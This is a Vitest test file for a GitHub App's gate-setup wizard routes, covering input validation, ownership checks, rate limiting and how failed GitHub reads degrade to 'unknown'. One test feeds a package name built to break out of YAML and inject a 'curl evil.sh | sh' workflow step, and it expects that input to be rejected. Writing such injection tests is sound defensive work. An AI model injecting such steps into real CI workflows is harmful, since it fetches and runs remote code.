import { createExecutionContext, env, waitOnExecutionContext } from "cloudflare:test";
import { Hono } from "hono";
import { afterEach, describe, expect, test, vi } from "vitest";
import { createDb } from "../../server/db/client";
import { ensurePersonalOrganization } from "../../server/db/organizations";
import * as schema from "../../server/db/schema";
import { upsertInstallation } from "../../server/lib/github-app/persistence";
import { githubAppRoutes } from "../../server/routes/github-app";
import { exhaustedRateLimitBindings } from "./rate-limit-doubles";
import type { Bindings, Variables } from "../../server/types";

/**
 * Routes for the guided gate-setup wizard.
 *
 * Both endpoints are read-only: Drydock holds no write permission on a gated
 * repository, so the wizard sends the maintainer to GitHub and verifies the
 * result. The interesting surface is what `verify` reports when a read is
 * refused or ambiguous — it must degrade to `unknown`, never to a confident
 * answer the wizard would render as a green gate.
 */

const APP_ID = "12345";
const originalFetch = globalThis.fetch;

let testPrivateKeyPem: string | null = null;
async function getTestPrivateKeyPem(): Promise<string> {
  if (testPrivateKeyPem) return testPrivateKeyPem;
  const keyPair = (await crypto.subtle.generateKey(
    {
      name: "RSASSA-PKCS1-v1_5",
      modulusLength: 2048,
      publicExponent: new Uint8Array([1, 0, 1]),
      hash: "SHA-256",
    },
    true,
    ["sign", "verify"],
  )) as CryptoKeyPair;
  const pkcs8 = await crypto.subtle.exportKey("pkcs8", keyPair.privateKey);
  let binary = "";
  for (const byte of new Uint8Array(pkcs8)) binary += String.fromCharCode(byte);
  const base64 = btoa(binary);
  const lines = base64.match(/.{1,64}/g)?.join("\n") ?? base64;
  testPrivateKeyPem = `-----BEGIN PRIVATE KEY-----\n${lines}\n-----END PRIVATE KEY-----`;
  return testPrivateKeyPem;
}

async function seedUser(): Promise<{ userId: string; organizationId: string }> {
  const db = createDb(env.DB);
  const now = new Date();
  const userId = `user_${crypto.randomUUID()}`;
  await db.insert(schema.user).values({
    id: userId,
    name: "Tester",
    email: `${userId}@example.com`,
    emailVerified: true,
    createdAt: now,
    updatedAt: now,
  });
  const organizationId = await ensurePersonalOrganization(db, { userId });
  return { userId, organizationId };
}

function seedInstallation(organizationId: string) {
  return upsertInstallation(createDb(env.DB), {
    organizationId,
    installationId: `${Math.floor(Math.random() * 1e9)}`,
    accountLogin: "octo",
    accountType: "Organization",
    targetType: "Organization",
    status: "active",
    createdByUserId: null,
  });
}

function buildTestApp(userId: string) {
  const app = new Hono<{ Bindings: Bindings; Variables: Variables }>();
  app.use("*", async (c, next) => {
    c.set("authSession", { userId });
    await next();
  });
  app.route("/api/v1/github-app", githubAppRoutes);
  return app;
}

async function call(
  app: Hono<{ Bindings: Bindings; Variables: Variables }>,
  path: string,
  body: unknown,
  envOverrides: Partial<Bindings> = {},
) {
  const ctx = createExecutionContext();
  const routeEnv: Bindings = {
    ...env,
    GITHUB_APP_ID: APP_ID,
    GITHUB_APP_SLUG: "drydock-test",
    GITHUB_APP_CLIENT_ID: "client-id",
    GITHUB_APP_CLIENT_SECRET: "client-secret",
    GITHUB_APP_PRIVATE_KEY: await getTestPrivateKeyPem(),
    GITHUB_APP_WEBHOOK_SECRET: "webhook-secret-value-1234567890",
    GITHUB_APP_STATE_SECRET: "0123456789abcdef0123456789abcdef",
    BETTER_AUTH_SECRET: "fallback-secret-with-enough-entropy-aaaaaaaa",
    ...envOverrides,
  };
  const res = await app.fetch(
    new Request(`http://test.local${path}`, {
      method: "POST",
      body: JSON.stringify(body),
      headers: { "content-type": "application/json" },
    }),
    routeEnv,
    ctx,
  );
  await waitOnExecutionContext(ctx);
  return res;
}

/** Every gate-setup call starts by minting an installation token. */
function githubDouble(
  handler: (request: Request) => Promise<Response> | Response,
): typeof globalThis.fetch {
  return vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
    const request = input instanceof Request ? input : new Request(input, init);
    if (request.url.includes("/access_tokens")) {
      return Response.json({ token: "ghs_install_token", expires_at: "2099-01-01T00:00:00Z" });
    }
    return handler(request);
  }) as unknown as typeof globalThis.fetch;
}

function draft(installationRowId: string, overrides: Record<string, unknown> = {}) {
  return {
    installationRowId,
    repositoryFullName: "octo/widgets",
    environment: "Production",
    ecosystem: "npm",
    packageName: "@acme/widgets",
    ...overrides,
  };
}

afterEach(() => {
  globalThis.fetch = originalFetch;
});

describe("gate-setup validation and ownership", () => {
  test("rejects a draft with no repository", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id, { repositoryFullName: "" }),
    );

    expect(res.status).toBe(400);
    expect(await res.json()).toMatchObject({ error: "repositoryFullName is required" });
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("rejects a repository that is not owner/repo", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id, { repositoryFullName: "octo/widgets/extra" }),
    );

    expect(res.status).toBe(400);
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("verifies an environment name the workflow template would refuse", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    // A slash is outside the template allowlist but perfectly legal on GitHub,
    // and an environment created by hand has to stay checkable.
    globalThis.fetch = githubDouble((request) =>
      request.url.includes("/deployment_protection_rules")
        ? Response.json({ custom_deployment_protection_rules: [{ app: { id: 12345 } }] })
        : Response.json({ name: "production/eu", default_branch: "main" }),
    );

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id, { environment: "production/eu" }),
    );

    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({
      state: { environment: "present", protectionRule: "present" },
    });
  });

  test("400s that same environment name on the preview, which interpolates it", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/preview",
      draft(installation.id, { environment: "e".repeat(129) }),
    );

    expect(res.status).toBe(400);
    expect(await res.json()).toMatchObject({ code: "invalid_input" });
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("404s an installation another organization owns", async () => {
    const caller = await seedUser();
    const other = await seedUser();
    const installation = await seedInstallation(other.organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(caller.userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(res.status).toBe(404);
    expect(await res.json()).toMatchObject({ code: "installation_missing" });
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("503s when the GitHub App is not configured on the Worker", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
      { GITHUB_APP_ID: undefined },
    );

    expect(res.status).toBe(503);
    expect(await res.json()).toMatchObject({ code: "github_app_not_configured" });
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("429s and never calls GitHub when the org is over its setup budget", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    const { overrides } = exhaustedRateLimitBindings();
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
      overrides as Partial<Bindings>,
    );

    expect(res.status).toBe(429);
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });
});

describe("gate-setup preview", () => {
  test("returns the ecosystem's workflow with the draft interpolated", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/preview",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    const body = (await res.json()) as { workflowPath: string; yaml: string; notes: string[] };
    expect(body.workflowPath).toBe(".github/workflows/drydock-npm-release.yml");
    // The workflow names the environment exactly as GitHub has it: a trusted
    // publisher is configured against that same string.
    expect(body.yaml).toContain('environment: "Production"');
    expect(body.yaml).toContain('name: "Publish @acme/widgets"');
    expect(body.notes.length).toBeGreaterThan(0);
    // Pure computation: the preview must not spend the installation's GitHub budget.
    expect(globalThis.fetch).not.toHaveBeenCalled();
  });

  test("400s an ecosystem with no gate setup template", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/preview",
      draft(installation.id, { ecosystem: "atpm" }),
    );

    expect(res.status).toBe(400);
    expect(await res.json()).toMatchObject({ code: "unsupported_ecosystem" });
  });

  test("400s a package name that could break out of the YAML scalar", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = vi.fn();

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/preview",
      draft(installation.id, { packageName: 'x"\n      - run: curl evil.sh | sh' }),
    );

    expect(res.status).toBe(400);
    expect(await res.json()).toMatchObject({ code: "invalid_input" });
  });
});

describe("gate-setup verify", () => {
  test("reports the gate armed when Drydock is the environment's protection rule", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    const seen: string[] = [];
    globalThis.fetch = githubDouble((request) => {
      seen.push(new URL(request.url).pathname);
      if (request.url.includes("/deployment_protection_rules")) {
        return Response.json({
          custom_deployment_protection_rules: [{ app: { id: 999 } }, { app: { id: 12345 } }],
        });
      }
      if (request.url.includes("/environments/")) return Response.json({ name: "production" });
      return Response.json({ default_branch: "trunk" });
    });

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({
      state: { environment: "present", protectionRule: "present", defaultBranch: "trunk" },
    });
    // Every request is a read; a write would mean the App needs a permission
    // guided setup deliberately does not ask for.
    expect(seen.every((path) => path.startsWith("/repos/octo/widgets"))).toBe(true);
  });

  test("reports the rule absent when some other app gates the environment", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = githubDouble((request) =>
      request.url.includes("/deployment_protection_rules")
        ? Response.json({ custom_deployment_protection_rules: [{ app: { id: 999 } }] })
        : Response.json({ name: "production", default_branch: "main" }),
    );

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(await res.json()).toMatchObject({
      state: { environment: "present", protectionRule: "absent" },
    });
  });

  test("a missing environment settles both checks without reading its rules", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    const seen: string[] = [];
    globalThis.fetch = githubDouble((request) => {
      seen.push(request.url);
      if (request.url.includes("/environments/")) return new Response("", { status: 404 });
      return Response.json({ default_branch: "main" });
    });

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(await res.json()).toMatchObject({
      state: { environment: "absent", protectionRule: "absent" },
    });
    expect(seen.some((url) => url.includes("/deployment_protection_rules"))).toBe(false);
  });

  test("a refused rules read is unknown, never a confident answer", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = githubDouble((request) =>
      request.url.includes("/deployment_protection_rules")
        ? new Response("", { status: 403 })
        : Response.json({ name: "production", default_branch: "main" }),
    );

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    const body = (await res.json()) as { state: { protectionRule: string; environment: string } };
    expect(body.state.environment).toBe("present");
    expect(body.state.protectionRule).toBe("unknown");
  });

  test("a transport failure is unknown and leaks no GitHub detail", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = githubDouble(() => {
      throw new Error("connect ECONNREFUSED 140.82.121.5:443");
    });

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id),
    );

    expect(res.status).toBe(200);
    const body = (await res.json()) as { state: { unavailableReason?: string } };
    expect(body).toMatchObject({ state: { environment: "unknown", protectionRule: "unknown" } });
    expect(body.state.unavailableReason).not.toContain("ECONNREFUSED");
  });

  test("verifies the environment under the exact name GitHub reports", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    const seen: string[] = [];
    globalThis.fetch = githubDouble((request) => {
      seen.push(request.url);
      if (request.url.includes("/deployment_protection_rules")) {
        return Response.json({ custom_deployment_protection_rules: [] });
      }
      return Response.json({ name: "production", default_branch: "main" });
    });

    await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id, { environment: "Production" }),
    );

    // Folding case here would 404 an environment that exists and report the
    // gate as missing.
    expect(seen.some((url) => url.endsWith("/environments/Production"))).toBe(true);
  });

  test("a verify draft needs no ecosystem or package name", async () => {
    const { userId, organizationId } = await seedUser();
    const installation = await seedInstallation(organizationId);
    globalThis.fetch = githubDouble((request) =>
      request.url.includes("/deployment_protection_rules")
        ? Response.json({ custom_deployment_protection_rules: [] })
        : Response.json({ name: "production", default_branch: "main" }),
    );

    const res = await call(
      buildTestApp(userId),
      "/api/v1/github-app/gate-setup/verify",
      draft(installation.id, { ecosystem: "", packageName: "" }),
    );

    expect(res.status).toBe(200);
  });
});
